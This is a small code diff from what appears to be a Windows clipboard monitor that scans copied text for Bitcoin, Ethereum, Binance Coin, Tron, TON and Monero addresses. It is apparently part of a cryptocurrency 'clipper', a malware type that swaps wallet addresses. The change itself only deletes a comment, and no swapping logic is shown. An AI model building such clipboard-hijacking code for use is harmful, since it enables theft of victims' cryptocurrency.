@@ -112,7 +112,7 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLi
 
         checkBitcoinAddress(sClipboard);
         checkEthereumAddress(sClipboard);
-        checkBinanceCoinAddress(sClipboard); // Issue with memo (use address without memo)
+        checkBinanceCoinAddress(sClipboard);
         checkTronAdress(sClipboard);
         checkTonAddress(sClipboard);
         checkMoneroAddress(sClipboard);
